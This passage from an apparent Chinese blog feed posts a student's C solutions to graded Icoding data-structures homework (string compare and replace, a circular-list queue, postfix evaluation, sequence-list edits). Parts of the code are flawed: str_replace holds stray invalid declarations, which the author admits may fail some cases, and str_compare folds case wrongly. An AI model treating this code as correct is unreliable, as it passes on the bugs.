        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li>串比较<br>不调用库函数，自己实现字符串的比较操作：<code>该操作当比较的两个字符是都是字母，且两个字符互为大小写（如a和A、e和E）时认为两个字符相同，否则不同，其比较结果按这两个字符的原值确定。</code>函数的返回值规定如下：<br>返回值 &lt; 0：第一个不匹配的字符在 ptr1 中的值低于 ptr2 中的值<br>返回值 == 0：两个字符串的内容相等<br>返回值 &gt; 0：第一个不匹配的字符在 ptr1 中的值大于在 ptr2 中的值</li></ol><p>函数原型如下： </p><blockquote><p>int str_compare(const char* ptr1, const char* ptr2);</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-31, Tue, 22:26:53</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;dsstring.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int str_compare(const char* ptr1, const char* ptr2)</span><br><span class="line">&#123;</span><br><span class="line">    char* p1 &#x3D; ptr1;</span><br><span class="line">    char* p2 &#x3D; ptr2;</span><br><span class="line">    int flag &#x3D; 0;</span><br><span class="line">    while (*p1 !&#x3D; &#39;\0&#39; &amp;&amp; *p2 !&#x3D; &#39;\0&#39;) &#123;</span><br><span class="line">        if (*p1 &#x3D;&#x3D; *p2 || *p1 &#x3D;&#x3D; *p2 - 32 || *p2 &#x3D;&#x3D; *p1 - 32) &#123;</span><br><span class="line">            flag &#x3D; 0;</span><br><span class="line">        &#125; else if (*p1 &lt; *p2) &#123;</span><br><span class="line">            flag &#x3D; -1;</span><br><span class="line">            break;</span><br><span class="line">        &#125; else if (*p1 &gt; *p2) &#123;</span><br><span class="line">            flag &#x3D; 1;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        p1++;</span><br><span class="line">        p2++;</span><br><span class="line">    &#125;</span><br><span class="line">    if (*p1 !&#x3D; &#39;\0&#39; &amp;&amp; *p2 &#x3D;&#x3D; &#39;\0&#39;)</span><br><span class="line">        flag &#x3D; 1;</span><br><span class="line">    else if (*p1 &#x3D;&#x3D; &#39;\0&#39; &amp;&amp; *p2 !&#x3D; &#39;\0&#39;)</span><br><span class="line">        flag &#x3D; -1;</span><br><span class="line">    return flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li>串替换<br>不调用库函数，自己实现字符串替换操作，函数原型为：<blockquote><p>int str_replace(const char *in, char *out, int outlen, const char *oldstr, const char *newstr);</p></blockquote></li></ol><p>参数说明:<br>    in， 原始字符串，保持不变<br>    out, 存放替换结果的字符串<br>    outlen，out空间的大小<br>    oldstr，要替换的旧字符串<br>    newstr，替换成的新字符串<br>函数返回成功替换的次数，即有多少个子串被成功替换</p><p>在替换过程中，任何情况下所得字符串（及结束符）不应该超过 outlen，如果某次替换所得字符串的长度超过 outlen，则不进行这次替换操作，整个替换操作结束。如：<br>原始串为 “aaabbbccc”，outlen 为14, oldstr 为 “c”，newstr 为 “333” 时，两次替换后得 “aaabbb333333c”，此时字符串占用空间为14字节。<br>如果再进行替换，则会超出 out 所占用的空间，所以停止替换操作。此时函数应该返回 2, out指向的串为 “aaabbb333333c”<br>再如：原始串为 “aaabbbccc”，outlen 为10, oldstr 为 “bb”，newstr 为 “123456”，进行替换后所得的串应该为 “aaa123456” （长度为9）与结束符一共占 10 个字节，此时函数应该返回 1。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-04-07, Tue, 19:43:54</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;dsstring.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int str_replace(const char* in, char* out, int outlen, const char* oldstr, const char* newstr)</span><br><span class="line">&#123;</span><br><span class="line">    char a &#x3D; &quot;aaabbbccc&quot;;</span><br><span class="line">    char b &#x3D; &quot;c&quot;, c &#x3D; &quot;cc&quot;, d &#x3D; &quot;123&quot;, e &#x3D; &quot;123456&quot;, f &#x3D; &quot;12345678&quot;;</span><br><span class="line"></span><br><span class="line">    char *cur1 &#x3D; in, *cur2 &#x3D; out;</span><br><span class="line">    int len &#x3D; 1, ans &#x3D; 0;</span><br><span class="line">    while (*out !&#x3D; 0)</span><br><span class="line">        *out &#x3D; 0, out++;</span><br><span class="line">    while (len &lt; outlen &amp;&amp; *cur1) &#123;</span><br><span class="line">        int flag &#x3D; 1;</span><br><span class="line">        char *p1 &#x3D; cur1, *p2 &#x3D; oldstr;</span><br><span class="line">        while (*p1 &amp;&amp; *p2 &amp;&amp; *p1 &#x3D;&#x3D; *p2)</span><br><span class="line">            p1++, p2++;</span><br><span class="line">        if (*p2 !&#x3D; 0)</span><br><span class="line">            flag &#x3D; 0;</span><br><span class="line">        if (flag) &#123;</span><br><span class="line">            char* p &#x3D; newstr;</span><br><span class="line">            int len1 &#x3D; len;</span><br><span class="line">            while (*p)</span><br><span class="line">                len1++, *p++;</span><br><span class="line">            if (len1 &gt; outlen) &#123;</span><br><span class="line">                while (*cur1 &amp;&amp; len &lt; outlen + 1)</span><br><span class="line">                    *cur2 &#x3D; *cur1, len++, cur1++, cur2++;</span><br><span class="line">                return ans;</span><br><span class="line">            &#125;</span><br><span class="line">            cur1 &#x3D; p1;</span><br><span class="line">            ans++;</span><br><span class="line">            p &#x3D; newstr;</span><br><span class="line">            while (*p)</span><br><span class="line">                *cur2 &#x3D; *p, cur2++, p++, len++;</span><br><span class="line">        &#125; else</span><br><span class="line">            *cur2 &#x3D; *cur1, len++, cur1++, cur2++;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>警告！本代码可能无法完成所有情况的操作<br>当然你如果也是欧皇的话可以无视（因为judge平台测试数据的随机性）<br>正在开发一段满足所有条件的代码<br>Hints：自己实现几个关键的string操作函数即可，比如strlen等等</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第二次作业解析-队列栈</title>
      <link href="/post/4641.html"/>
      <url>/post/4641.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li>队列 循环列表表示栈<br>假设以带头结点的循环链表表示队列，并且只设一个指针指向队尾元素结点（注意不设头指针），请完成下列任务：<br>1: 队列初始化，成功返回真，否则返回假  <blockquote><p>bool init_queue(LinkQueue <em>LQ);<br>2: 入队列，成功返回真，否则返回假：<br>bool enter_queue(LinkQueue *LQ, ElemType x);<br>3: 出队列，成功返回真，且</em>x为出队的值，否则返回假<br>bool leave_queue(LinkQueue *LQ, ElemType *x);</p></blockquote></li></ol><p>相关定义如下：</p><blockquote><p>typedef struct _QueueNode {<br>    ElemType data;          /<em>数据域</em>/<br>    struct _QueueNode <em>next;      /*指针域</em>/<br>}LinkQueueNode, *LinkQueue;</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-26, Thu, 10:34:14</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool init_queue(LinkQueue* LQ)</span><br><span class="line">&#123;</span><br><span class="line">    *LQ &#x3D; (LinkQueue)malloc(sizeof(LinkQueueNode));</span><br><span class="line">    if (*LQ &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    (*LQ)-&gt;next &#x3D; *LQ;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool enter_queue(LinkQueue* LQ, ElemType x)</span><br><span class="line">&#123;</span><br><span class="line">    if (*LQ &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkQueueNode* p &#x3D; (LinkQueueNode*)malloc(sizeof(LinkQueueNode));</span><br><span class="line">    if (!p) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        p-&gt;data &#x3D; x;</span><br><span class="line">        p-&gt;next &#x3D; (*LQ)-&gt;next;</span><br><span class="line">        (*LQ)-&gt;next &#x3D; p;</span><br><span class="line">        *LQ &#x3D; p;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool leave_queue(LinkQueue* LQ, ElemType* x)</span><br><span class="line">&#123;</span><br><span class="line">    LinkQueue rear &#x3D; (*LQ);</span><br><span class="line">    if (rear-&gt;next &#x3D;&#x3D; rear)</span><br><span class="line">        return 0;</span><br><span class="line">    (*x) &#x3D; rear-&gt;next-&gt;next-&gt;data;</span><br><span class="line">    if (rear-&gt;next-&gt;next &#x3D;&#x3D; rear) &#123;</span><br><span class="line">        (*LQ) &#x3D; (*LQ)-&gt;next;</span><br><span class="line">        free(rear);</span><br><span class="line">        (*LQ)-&gt;next &#x3D; (*LQ);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkQueue temp &#x3D; rear-&gt;next-&gt;next;</span><br><span class="line">    rear-&gt;next-&gt;next &#x3D; temp-&gt;next;</span><br><span class="line">    free(temp);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li>栈 后缀表达式计算<br>请使用已定义好的栈完成后缀表达式计算：<br>(1)如果是操作数，直接入栈<br>(2)如果是操作符op，连续出栈两次，得到操作数x 和 y,计算 x op y，并将结果入栈。<br>后缀表达式示例如下：<br>9  3  1  -  3  *  +  10  2  /  +<br>13  445  +  51  /  6  -<br>操作数、操作符之间由空格隔开，操作符有 +，-，*, /, %共 5 种符号，所有操作数都为整型。<br>栈的定义如下：<blockquote><p>#define Stack_Size 50<br>typedef struct{</p><pre><code>ElemType elem[Stack_Size];int top;</code></pre><p>}Stack;</p><p>bool push(Stack* S, ElemType x);<br>bool pop(Stack* S, ElemType *x);<br>void init_stack(Stack *S);</p></blockquote></li></ol><p>其中，栈初始化的实现为：</p><blockquote><p>void init_stack(Stack *S){<br>    S-&gt;top = -1;<br>}</p></blockquote><p>需要完成的函数定义为：</p><blockquote><p>int compute_reverse_polish_notation(char *str);<br>函数接收一个字符指针，该指针指向一个字符串形式的后缀表达式，函数返回该表达式的计算结果。</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-23, Mon, 19:19:11</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int compute_reverse_polish_notation(char* str)</span><br><span class="line">&#123;</span><br><span class="line">    Stack s;</span><br><span class="line">    init_stack(&amp;s);</span><br><span class="line">    int num &#x3D; 0;</span><br><span class="line">    while (*str !&#x3D; 0) &#123;</span><br><span class="line">        while (*str &#x3D;&#x3D; &#39; &#39;)</span><br><span class="line">            str++;</span><br><span class="line">        if (*str &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        if (*str &#x3D;&#x3D; &#39;+&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, a + b);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;-&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, b - a);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;*&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, a * b);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, b &#x2F; a);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else if (*str &#x3D;&#x3D; &#39;%&#39;) &#123;</span><br><span class="line">            int a, b;</span><br><span class="line">            pop(&amp;s, &amp;a);</span><br><span class="line">            pop(&amp;s, &amp;b);</span><br><span class="line">            push(&amp;s, b % a);</span><br><span class="line">            str++;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            int x &#x3D; 0;</span><br><span class="line">            do &#123;</span><br><span class="line">                x &#x3D; x * 10 + *str - &#39;0&#39;;</span><br><span class="line">                str++;</span><br><span class="line">            &#125; while (*str &gt;&#x3D; &#39;0&#39; &amp;&amp; *str &lt;&#x3D; &#39;9&#39; &amp;&amp; *str !&#x3D; 0);</span><br><span class="line">            push(&amp;s, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pop(&amp;s, &amp;num);</span><br><span class="line">    return num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 栈 </tag>
            
            <tag> 后缀表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第一次作业解析-线性表</title>
      <link href="/post/3472.html"/>
      <url>/post/3472.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li><p>顺序表 删除指定范围<br>设计一个高效的算法，从顺序表L中删除所有值介于x和y之间(包括x和y)的所有元素（假设y&gt;=x），要求时间复杂度为O(n)，空间复杂度为O(1)。<br>函数原型如下：</p><blockquote><p>void del_x2y(SeqList *L, ElemType x, ElemType y);<br>相关定义如下：<br>struct _seqlist{</p><pre><code>ElemType elem[MAXSIZE];int last;</code></pre><p>};</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-02, Mon, 11:46:50</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void del_x2y(SeqList* L, ElemType x, ElemType y)</span><br><span class="line">&#123;</span><br><span class="line">    int last &#x3D; -1;</span><br><span class="line">    for (int i &#x3D; 0; i &lt;&#x3D; L-&gt;last; i++)</span><br><span class="line">        if (L-&gt;elem[i] &lt; x || L-&gt;elem[i] &gt; y)</span><br><span class="line">            L-&gt;elem[++last] &#x3D; L-&gt;elem[i];</span><br><span class="line">    L-&gt;last &#x3D; last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li><p>顺序表 删除重复<br>编写算法，在一非递减的顺序表L中，删除所有值相等的多余元素。要求时间复杂度为O(n)，空间复杂度为O(1)。<br>函数原型如下：</p><blockquote><p>void del_dupnum(SeqList *L)<br>相关定义如下：<br>struct _seqlist{</p><pre><code>ElemType elem[MAXSIZE];int last;</code></pre><p>};<br>typedef struct _seqlist SeqList;</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-02, Mon, 11:49:49</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void del_dupnum(SeqList* L)</span><br><span class="line">&#123;</span><br><span class="line">    int flag &#x3D; 0, val &#x3D; L-&gt;elem[0];</span><br><span class="line">    for (int i &#x3D; 1; i &lt;&#x3D; L-&gt;last; i++) &#123;</span><br><span class="line">        if (val !&#x3D; L-&gt;elem[i]) &#123;</span><br><span class="line">            val &#x3D; L-&gt;elem[i];</span><br><span class="line">            flag +&#x3D; 1;</span><br><span class="line">            L-&gt;elem[flag] &#x3D; val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;last &#x3D; flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><ol><li>顺序表 数据调整<br>已知顺序表L中的数据元素类型为int。设计算法将其调整为左右两部分，左边的元素（即排在前面的）均为奇数，右边所有元素（即排在后面的）均为偶数，并要求算法的时间复杂度为O(n),空间复杂度为O（1）。<br>链表结点定义如下：<blockquote><p>void odd_even(SeqList *L);<br>相关定义如下：<br>struct _seqlist{</p><pre><code>ElemType elem[MAXSIZE];int last;</code></pre><p>};<br>typedef struct _seqlist SeqList;</p></blockquote></li></ol><p>2.解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-03, Tue, 18:32:04</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void odd_even(SeqList* L)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; 0;</span><br><span class="line">    int j &#x3D; L-&gt;last;</span><br><span class="line">    while (i &lt; j) &#123;</span><br><span class="line">        while (L-&gt;elem[i] % 2 !&#x3D; 0)</span><br><span class="line">            i++;</span><br><span class="line">        while (L-&gt;elem[j] % 2 &#x3D;&#x3D; 0)</span><br><span class="line">            j--;</span><br><span class="line">        if (i &lt; j) &#123;</span><br><span class="line">            int t &#x3D; L-&gt;elem[i];</span><br><span class="line">            L-&gt;elem[i] &#x3D; L-&gt;elem[j];</span><br><span class="line">            L-&gt;elem[j] &#x3D; t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h1 id="T4"><a href="#T4" class="headerlink" title="T4"></a>T4</h1><ol><li><p>链表 删除范围内结点<br>已知线性表中的元素（整数）以值递增有序排列，并以单链表作存储结构。试写一高效算法，删除表中所有大于mink且小于maxk的元素（若表中存在这样的元素），分析你的算法的时间复杂度。<br>链表结点定义如下：</p><blockquote><p>struct _lnklist{</p><pre><code>ElemType data;struct _lnklist *next;</code></pre><p>};<br>typedef struct _lnklist Node;<br>typedef struct _lnklist *LinkList;<br>函数原型如下：<br>void lnk_del_x2y(LinkList L, ElemType mink, ElemType maxk)<br>其中L指向链表的头结点。</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 